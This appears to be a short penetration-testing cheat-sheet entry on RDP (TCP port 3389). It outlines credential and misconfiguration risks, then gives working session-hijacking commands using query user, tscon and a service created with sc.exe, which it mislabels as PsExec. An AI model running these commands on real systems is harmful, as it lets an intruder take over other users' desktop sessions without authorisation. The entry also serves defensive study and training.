# TCP 3389 (RDP)

## Overview

During Windows service enumeration, port 3389 is used for Remote Desktop Protocol, which provides graphical access to a system. If exposed and weakly secured, it can be targeted through credential attacks or misconfiguration weaknesses. It is often a high-value target due to the level of access it provides if successfully compromised.

Session Hijacking 
We need SYSTEM privileges and use tscon.exe. First query user 
```
query user
```
```
tscon #{TARGET_SESSION_ID} /dest:#{OUR_SESSION_NAME}
tscon #4 /dest:#rdp-tcp#13
```

If we have local administrator privileges we can use PsExec
```
sc.exe create sessionhijack binpath= "cmd.exe /k tscon 4 /dest:rdp-tcp#13"
```
```
net start sessionhijack
```
